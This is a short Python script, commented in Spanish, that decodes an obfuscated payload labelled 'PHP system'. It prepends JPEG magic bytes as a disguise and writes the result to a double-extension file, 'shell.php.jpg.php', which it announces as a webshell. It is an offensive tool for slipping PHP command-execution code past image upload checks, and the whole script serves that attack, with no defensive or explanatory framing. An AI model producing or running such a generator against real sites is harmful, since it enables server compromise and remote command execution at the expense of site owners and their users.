import os
import lazyencoder_decoder as ed

shift_value = 3
substitution_key = "clave"

payloads = {
        "PHP system": "UR9uhMOja3qngECyYFPmW0YSDdrmzDVbAQr7WG8-"
}
print(f"[?] payloads ofuscados dict: {payloads}")
formatted_payloads = {}

# Desofuscar el diccionario de cadenas
decoded_dict = {
    key: ed.decode(value, shift_value, substitution_key)
    for key, value in payloads.items()
}
print(f"[?] payload desofuscado: {decoded_dict}")

valor = decoded_dict['PHP system']

disfraz = 'ÿØÿà'
print(
    f"[*] disfraz inyectado jpg magic numbers = {disfraz}"
)
file_content = disfraz + ' ' + valor
path = os.getcwd()

f = open(path + "/sessions/shell.php.jpg.php", "w")
f.write(file_content)
f.close()

print(f"[*] Webshell en {path}/sessions/shell.php.jpg.php")